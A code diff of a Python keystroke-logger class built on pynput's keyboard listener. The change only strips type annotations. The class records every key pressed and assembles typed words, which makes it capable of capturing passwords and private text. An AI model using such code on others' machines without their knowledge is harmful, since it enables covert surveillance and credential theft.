@@ -1,12 +1,11 @@
 from pynput import keyboard
-from typing import List
 from  interface_key_logger import IKeyLogger  # Your interface
 
 class KeyLogger(IKeyLogger):
     def __init__(self):
-        self.logged_keys: List[str] = []
-        self.current_word: List[str] = []
-        self.words: List[str] = []
+        self.logged_keys = []
+        self.current_word = []
+        self.words = []
         self.ctrl_pressed = False  # Track if Ctrl is pressed
         self.listener = keyboard.Listener(on_press=self._on_press, on_release=self._on_release)
 
@@ -48,7 +47,7 @@ class KeyLogger(IKeyLogger):
     def stop_logging(self) -> None:
         self.listener.stop()
 
-    def get_logged_keys(self) -> List[str]:
+    def get_logged_keys(self):
         if self.current_word:
             self.words.append(''.join(self.current_word))
             self.current_word = []
